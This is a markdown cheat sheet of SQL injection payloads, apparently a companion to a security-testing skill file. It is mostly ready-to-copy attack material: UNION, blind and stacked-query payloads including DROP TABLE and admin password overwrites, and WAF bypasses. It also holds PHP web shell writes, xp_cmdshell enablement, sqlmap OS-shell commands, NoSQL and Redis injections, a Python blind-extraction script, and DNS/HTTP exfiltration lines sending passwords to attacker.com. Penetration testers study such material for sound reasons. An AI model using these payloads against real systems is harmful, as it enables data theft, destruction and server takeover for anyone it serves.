# SQL Injection Payloads

> This file is a companion to `SKILL.md`, organizing common payloads for SQL injection testing by injection type.
> Purpose: Quickly find payloads for specific injection types, ready to copy for testing.
> All payloads are for authorized security testing only.

---

## Index

1. [Injection Point Detection](#1-injection-point-detection)
2. [UNION Injection](#2-union-injection)
3. [Error-based Injection](#3-error-based-injection)
4. [Boolean Blind Injection](#4-boolean-blind-injection)
5. [Time Blind Injection](#5-time-blind-injection)
6. [Double Query Injection](#6-double-query-injection)
7. [Stacked Queries](#7-stacked-queries)
8. [WAF Bypass Techniques](#8-waf-bypass-techniques)
9. [Cross-Database Injection](#9-cross-database-injection)
10. [File Read/Write and Privilege Escalation](#10-file-readwrite-and-privilege-escalation)

---

## 1. Injection Point Detection

### String Type Closure Probing

```sql
'          -- Single quote
"          -- Double quote
')         -- Single quote + parenthesis
"))        -- Double quote + double parenthesis
`          -- Backtick
```

### Injection Confirmation

```sql
-- String type
' AND '1'='1    -- Page normal
' AND '1'='2    -- Page abnormal -> injection confirmed

-- Numeric type
AND 1=1          -- Page normal
AND 1=2          -- Page abnormal -> injection confirmed

-- With comment characters
' AND '1'='1'-- -
' AND '1'='1'--+
' AND '1'='1'#    -- MySQL comment
```

---

## 2. UNION Injection

### Determine Column Count

```sql
' ORDER BY 1-- -     -- Success
' ORDER BY 5-- -     -- Failure -> columns < 5
' ORDER BY 3-- -     -- Success -> 3 columns total
```

### Identify Echo Position

```sql
' UNION SELECT 1,2,3-- -
' UNION SELECT NULL,NULL,NULL-- -    -- Compatible with all types
```

### Information Extraction

```sql
-- Database information
' UNION SELECT 1,database(),version()-- -
' UNION SELECT 1,@@datadir,@@version_compile_os-- -

-- Enumerate all databases
' UNION SELECT 1,group_concat(schema_name),3 FROM information_schema.schemata-- -

-- Enumerate tables in current database
' UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database()-- -

-- Enumerate column names
' UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_name='users'-- -

-- Extract data
' UNION SELECT 1,group_concat(username,0x3a,password),3 FROM users-- -
```

---

## 3. Error-based Injection

### extractvalue() (MySQL 5.1.5+, max 32 characters)

```sql
' AND extractvalue(1,concat(0x7e,(SELECT database()),0x7e))--+
' AND extractvalue(1,concat(0x7e,(SELECT version()),0x7e))--+
' AND extractvalue(1,concat(0x7e,(SELECT user()),0x7e))--+
```

### updatexml() (MySQL 5.1.5+, max 32 characters)

```sql
' AND updatexml(1,concat(0x7e,(SELECT database()),0x7e),1)--+
' AND updatexml(1,concat(0x7e,(SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()),0x7e),1)--+
```

### Long Data Segmented Reading

```sql
-- Characters 1-31
' AND extractvalue(1,concat(0x7e,SUBSTRING((SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()),1,31),0x7e))--+
-- Characters 32-62
' AND extractvalue(1,concat(0x7e,SUBSTRING((SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()),32,31),0x7e))--+
```

---

## 4. Boolean Blind Injection

### Database Name Extraction

```sql
-- Determine length
' AND (SELECT LENGTH(database()))>5-- -
' AND (SELECT LENGTH(database()))>10-- -
' AND (SELECT LENGTH(database()))=8-- -

-- Character-by-character extraction
' AND SUBSTRING((SELECT database()),1,1)='s'-- -
' AND SUBSTRING((SELECT database()),2,1)='e'-- -
' AND ASCII(SUBSTRING((SELECT database()),1,1))>100-- -

-- Binary search acceleration
' AND ASCII(SUBSTRING((SELECT database()),1,1))>115-- -
' AND ASCII(SUBSTRING((SELECT database()),1,1))<120-- -
```

### Table Name Extraction

```sql
' AND (SELECT COUNT(table_name) FROM information_schema.tables WHERE table_schema=database())>5-- -
' AND SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1),1,1)='u'-- -
```

---

## 5. Time Blind Injection

### Basic Time Blind Injection

```sql
' AND IF(1=1,SLEEP(3),0)-- -
' AND IF(1=2,SLEEP(3),0)-- -

-- Extract database name
' AND IF(SUBSTRING((SELECT database()),1,1)='s',SLEEP(3),0)-- -
' AND IF(ASCII(SUBSTRING((SELECT database()),1,1))>100,SLEEP(3),0)-- -
```

### BENCHMARK Alternative (when SLEEP is filtered)

```sql
' AND IF(1=1,BENCHMARK(10000000,SHA1('test')),0)-- -
```

---

## 6. Double Query Injection

### floor()+rand()+group by (classic method, no length limit)

```sql
' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT database()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--+

-- Extract table names
' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--+

-- Extract column names
' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 0,1),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--+
```

### exp() / geometrycollection() / polygon()

```sql
' AND EXP(~(SELECT * FROM (SELECT database())x))--+
' AND geometrycollection((SELECT * FROM (SELECT database())x))--+
' AND multipoint((SELECT * FROM (SELECT database())x))--+
' AND polygon((SELECT * FROM (SELECT database())x))--+
```

---

## 7. Stacked Queries

```sql
'; SELECT user(),database(),@@version-- -
'; INSERT INTO users(username,password) VALUES('hacker','p@ss')-- -
'; UPDATE users SET password='hacked' WHERE username='admin'-- -
'; DROP TABLE logs-- -
```

---

## 8. WAF Bypass Techniques

### Comment Bypass

```sql
'/**/UNION/**/SELECT/**/1,2,3-- -
'/*!UNION*/ /*!SELECT*/ 1,2,3-- -                  -- MySQL inline comments
'/*!50000UNION*//*!50000SELECT*/ 1,2,3-- -          -- Specify version number
```

### Mixed Case

```sql
' UnIoN SeLeCt 1,2,3-- -
' uNiOn AlL sElEcT 1,2,3-- -
```

### Space Alternatives

```sql
'/**/UNION/**/SELECT/**/1,2,3-- -       -- Comment replacement
'%09UNION%09SELECT%091,2,3-- -           -- Tab
'%0aUNION%0aSELECT%0a1,2,3-- -           -- Newline
```

### Equivalent Function Replacement

```sql
-- SLEEP -> BENCHMARK
-- GROUP_CONCAT -> CONCAT_WS(0x3a,...)
-- SUBSTRING -> MID / LEFT / RIGHT
-- DATABASE() -> SCHEMA()
-- VERSION() -> @@VERSION
```

### sqlmap tamper Scripts

```bash
sqlmap -u "URL?id=1" --tamper=space2comment --batch
sqlmap -u "URL?id=1" --tamper=between,randomcase --batch
sqlmap -u "URL?id=1" --tamper=charencode --batch
```

---

## 9. Cross-Database Injection

### PostgreSQL

```sql
' AND 1=CAST((SELECT version()) AS int)--
' AND 1=CAST((SELECT current_database()) AS int)--
' UNION SELECT pg_read_file('/etc/passwd'),2,3--    -- Requires superuser
```

### MSSQL

```sql
' AND 1=CONVERT(int,(SELECT @@version))--
' AND 1=CONVERT(int,(SELECT DB_NAME()))--
'; EXEC xp_cmdshell 'whoami'--    -- Requires sysadmin
'; EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;--
```

### Oracle

```sql
' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE ROWNUM=1))--
' UNION SELECT table_name,NULL,NULL FROM all_tables WHERE owner='SCHEMA_NAME'--
```

---

## 10. File Read/Write and Privilege Escalation

### MySQL File Read

```sql
' UNION SELECT 1,LOAD_FILE('/etc/passwd'),3-- -
' UNION SELECT 1,LOAD_FILE('/var/www/html/config.php'),3-- -
' UNION SELECT 1,LOAD_FILE('C:\\inetpub\\wwwroot\\web.config'),3-- -    -- Windows
```

### MySQL File Write

```sql
' UNION SELECT 1,'<?php system($_GET["cmd"]); ?>',3 INTO OUTFILE '/var/www/html/shell.php'-- -
' UNION SELECT 1,'<?php @eval($_POST["cmd"]); ?>',3 INTO DUMPFILE '/var/www/html/shell.php'-- -
```

### sqlmap OS Shell

```bash
sqlmap -u "URL?id=1" --os-shell
sqlmap -u "URL?id=1" --os-shell --web-root=/var/www/html
```

---

## 11. Advanced Time-Based Blind (Multi-DBMS)

### MySQL Heavy Queries (when SLEEP is blocked)

```sql
' AND (SELECT COUNT(*) FROM information_schema.columns A, information_schema.columns B, information_schema.columns C)>0 AND '1'='1
' AND IF(SUBSTRING(database(),1,1)='s',(SELECT COUNT(*) FROM information_schema.columns A, information_schema.columns B),0)-- -
```

### PostgreSQL Time-Based

```sql
'; SELECT CASE WHEN (SELECT current_user)='postgres' THEN pg_sleep(5) ELSE pg_sleep(0) END--
' AND (SELECT CASE WHEN SUBSTRING(current_database(),1,1)='t' THEN pg_sleep(3) ELSE pg_sleep(0) END) IS NOT NULL--
```

### MSSQL Time-Based

```sql
'; IF (SELECT LEN(DB_NAME()))>5 WAITFOR DELAY '0:0:3'--
'; IF (SELECT SUBSTRING(DB_NAME(),1,1))='m' WAITFOR DELAY '0:0:3'--
' AND (SELECT CASE WHEN (SUBSTRING(@@version,1,1)='M') THEN 1 ELSE 1/(SELECT 0) END)=1--
```

### Oracle Time-Based

```sql
' AND (SELECT CASE WHEN SUBSTR(user,1,1)='S' THEN DBMS_PIPE.RECEIVE_MESSAGE('a',3) ELSE NULL END FROM dual) IS NOT NULL--
' AND 1=(SELECT CASE WHEN (SELECT LENGTH(banner) FROM v$version WHERE ROWNUM=1)>10 THEN DBMS_PIPE.RECEIVE_MESSAGE('x',3) ELSE 1 END FROM dual)--
```

---

## 12. WAF Evasion Advanced Techniques

### Double URL Encoding

```sql
%2527%2520UNION%2520SELECT%25201,2,3-- -
%252f%252a*/UNION%252f%252a*/SELECT%252f%252a*/1,2,3-- -
```

### Unicode/UTF-8 Normalization Bypass

```sql
＇ UNION SELECT 1,2,3-- -          -- Fullwidth apostrophe
' UNION SELECT 1,2,3%EF%BC%8D%EF%BC%8D -   -- Fullwidth dashes
```

### HTTP Parameter Pollution

```bash
# Split payload across duplicate parameters
curl "http://target/page?id=1'/*&id=*/UNION/*&id=*/SELECT/*&id=*/1,2,3--+-"

# JSON injection (when WAF only inspects URL params)
curl -X POST http://target/api/search \
  -H "Content-Type: application/json" \
  -d '{"query": "test\" UNION SELECT 1,database(),3-- -"}'
```

### Chunked Transfer Encoding Bypass

```bash
# Some WAFs don't inspect chunked bodies
printf 'POST /search HTTP/1.1\r\nHost: target.com\r\nTransfer-Encoding: chunked\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\n5\r\nid=1\'\r\n6\r\n UNION\r\n7\r\n SELECT\r\n5\r\n 1,2,\r\n1\r\n3\r\n3\r\n-- \r\n0\r\n\r\n' | nc target.com 80
```

### Comment Nesting and Obfuscation

```sql
' /*!50000UnIoN*/ /*!50000SeLeCt*/ 1,/*!50000dAtAbAsE*/(),3-- -
' UN/**/ION SE/**/LECT 1,2,3-- -
' %55nion %53elect 1,2,3-- -
' UNION ALL%0a%0dSELECT%0a%0d1,2,3-- -
```

---

## 13. Second-Order SQL Injection

### Registration-Based Second Order

```bash
# Step 1: Register with malicious username
curl -X POST http://target/register \
  -d "username=admin'-- -&password=test123&email=test@test.com"

# Step 2: Trigger the injection via password reset or profile view
curl http://target/profile \
  -H "Cookie: session=<session_after_login>"
# The stored username is used unsafely in a subsequent query
```

### Stored Payload in Database Fields

```sql
-- Insert payload into a field that will be used in another query later
INSERT INTO comments (user_id, body) VALUES (1, 'test'||(SELECT password FROM users WHERE username='admin')||'')

-- When admin views comments, the query uses the stored value unsafely:
-- SELECT * FROM comments WHERE body LIKE '%<stored_value>%'
```

### File Upload Filename Injection

```bash
# Upload file with SQL injection in filename
curl -X POST http://target/upload \
  -F "file=@test.txt;filename=test' UNION SELECT password FROM users-- .txt"
# If filename is stored and later used in a query without sanitization
```

---

## 14. NoSQL Injection Crossover

### MongoDB Injection

```bash
# Authentication bypass
curl -X POST http://target/login \
  -H "Content-Type: application/json" \
  -d '{"username": {"$gt": ""}, "password": {"$gt": ""}}'

# Data extraction via $regex
curl -X POST http://target/login \
  -H "Content-Type: application/json" \
  -d '{"username": "admin", "password": {"$regex": "^a"}}'

# Operator injection
curl http://target/api/users?username[$ne]=invalid
curl http://target/api/users?username[$regex]=admin.*
```

### MongoDB $where Injection

```bash
# JavaScript injection in $where clause
curl "http://target/api/search?q=test' || this.password.match(/^admin/) || 'a'=='a"

# Time-based extraction
curl "http://target/api/search?q=test' || (this.password[0]=='a' && sleep(3000)) || 'a'=='b"
```

### Redis CRLF Injection

```bash
# If user input reaches Redis commands
curl "http://target/api/cache?key=test%0d%0aSET%20hacked%20true%0d%0a"
curl "http://target/api/cache?key=test%0d%0aCONFIG%20SET%20dir%20/var/www/html%0d%0a"
```

---

## 15. ORM-Specific Injection Vectors

### Hibernate HQL Injection

```sql
-- HQL uses entity names, not table names
' AND 1=1 AND ''='
' UNION SELECT u.password FROM User u WHERE u.username='admin' AND '1'='1
```

### Django ORM Injection (via extra/raw)

```python
# If user input reaches .extra() or .raw()
# Vulnerable pattern: Model.objects.extra(where=[f"field = '{user_input}'"])
# Payload:
# user_input = "' OR '1'='1"

# GIS function injection (Django + PostGIS)
# Vulnerable: Model.objects.raw(f"SELECT * FROM table WHERE ST_Contains(geom, ST_GeomFromText('{user_input}'))")
```

### Sequelize Literal Injection

```javascript
// If Sequelize.literal() is used with user input
// Vulnerable: where: { id: Sequelize.literal(`${userInput}`) }
// Payload: "1; DROP TABLE users; --"

// Operator injection
// POST body: {"username": {"$like": "%admin%"}}
```

### ActiveRecord Injection (Ruby on Rails)

```ruby
# Vulnerable patterns:
# User.where("name = '#{params[:name]}'")
# User.order(params[:sort])

# Payloads:
# params[:name] = "' OR '1'='1"
# params[:sort] = "(CASE WHEN (SELECT 1 FROM users WHERE username='admin' AND password LIKE 'a%')=1 THEN name ELSE email END)"
```

---

## 16. Automated Exploitation Scripts

### sqlmap Advanced Usage

```bash
# Enumerate with specific techniques
sqlmap -u "URL?id=1" --technique=T --time-sec=3 --batch  # Time-based only
sqlmap -u "URL?id=1" --technique=B --batch               # Boolean-based only
sqlmap -u "URL?id=1" --technique=E --batch               # Error-based only

# Custom injection point
sqlmap -u "URL" --data="id=1*&submit=true" --batch       # * marks injection point

# POST JSON body
sqlmap -u "URL" --data='{"id":"1*"}' --content-type="application/json" --batch

# Through proxy with custom headers
sqlmap -u "URL?id=1" --proxy="http://127.0.0.1:8080" \
  --headers="X-Custom: value\nAuthorization: Bearer token" --batch

# Dump specific data
sqlmap -u "URL?id=1" -D dbname -T users -C username,password --dump --batch

# OS command execution
sqlmap -u "URL?id=1" --os-cmd="id" --batch
sqlmap -u "URL?id=1" --file-read="/etc/passwd" --batch
sqlmap -u "URL?id=1" --file-write="shell.php" --file-dest="/var/www/html/shell.php" --batch
```

### Custom Boolean Blind Extraction Script

```python
import requests
import string

def extract_data(url, query, charset=string.printable):
    """Extract data character by character via boolean blind SQLi"""
    result = ""
    for pos in range(1, 100):
        found = False
        for char in charset:
            payload = f"' AND SUBSTRING(({query}),{pos},1)='{char}'-- -"
            r = requests.get(url, params={"id": f"1{payload}"})
            if "Welcome" in r.text:  # True condition indicator
                result += char
                found = True
                print(f"\r[+] Extracting: {result}", end="", flush=True)
                break
        if not found:
            break
    print()
    return result

# Usage
db_name = extract_data(
    "http://target/page",
    "SELECT database()"
)
tables = extract_data(
    "http://target/page",
    "SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()"
)
```

### DNS Exfiltration (Out-of-Band)

```sql
-- MySQL (requires LOAD_FILE privilege)
' AND LOAD_FILE(CONCAT('\\\\',database(),'.attacker.com\\share'))-- -
' AND LOAD_FILE(CONCAT('\\\\',(SELECT password FROM users LIMIT 1),'.attacker.com\\a'))-- -

-- MSSQL (xp_dirtree)
'; DECLARE @d VARCHAR(1024); SET @d=(SELECT TOP 1 password FROM users); EXEC('master..xp_dirtree "\\'+@d+'.attacker.com\a"')--

-- Oracle (UTL_HTTP)
' AND 1=UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT user FROM dual))--
```
